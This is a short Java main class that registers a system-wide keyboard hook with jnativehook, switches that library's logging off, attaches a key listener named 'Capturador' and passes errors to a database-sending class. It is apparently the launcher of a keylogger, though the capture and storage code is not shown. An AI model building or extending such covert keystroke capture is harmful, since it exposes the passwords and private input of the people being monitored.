package tech.leonam;

import com.github.kwhat.jnativehook.GlobalScreen;
import tech.leonam.dao.EnviarBd;

import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;

public class Main {
    public static void main(String[] args) {
        try {
            var capturador = new Capturador();
            GlobalScreen.registerNativeHook();
            LogManager.getLogManager().reset();
            Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
            logger.setLevel(Level.OFF);
            GlobalScreen.addNativeKeyListener(capturador);
        } catch (Exception e) {
            new EnviarBd(e.getMessage());
            new EnviarBd(e.toString());
        }
    }
}
